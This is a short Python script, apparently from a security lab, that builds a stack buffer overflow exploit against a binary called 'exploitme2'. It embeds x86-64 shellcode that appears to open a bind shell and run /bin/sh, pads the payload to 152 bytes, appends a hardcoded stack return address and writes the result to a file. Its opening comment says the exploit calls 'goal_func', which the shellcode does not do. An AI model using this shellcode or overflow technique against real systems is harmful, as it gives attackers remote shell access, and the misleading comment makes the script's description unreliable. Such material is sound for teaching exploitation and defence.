#!/usr/bin/env python
# This script creates an exploit that calls goal_func in exploitme2

# Step 1: Shellcode
shellcode = b'j)Xj\x02_j\x01^\x99\x0f\x05R\xba\x01\x01\x01\x01\x81\xf2\x03\x01\x05\x01Rj\x10ZH\x89\xc5H\x89\xc7j1XH\x89\xe6\x0f\x05j2XH\x89\xefj\x01^\x0f\x05j+XH\x89\xef1\xf6\x99\x0f\x05H\x89\xc5j\x03^H\xff\xcex\x0bVj!XH\x89\xef\x0f\x05\xeb\xefjhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
exploit_byte_string = shellcode

# Step 2: Pad the exploit out to 152 bytes
pad_amount = 152 - len(exploit_byte_string)
exploit_byte_string = exploit_byte_string + b"A"*pad_amount

# Step 3: Write the target address as a little endian byte string

address_of_shellcode = 0x7fffffffde10

goal_address_bstr = address_of_shellcode.to_bytes(8, "little")

# Step 4: Append the target address byte string
exploit_byte_string = exploit_byte_string + goal_address_bstr

# Step 5: Write the exploit to a file
with open("shellcode.exploit", "wb") as f:
    f.write(exploit_byte_string)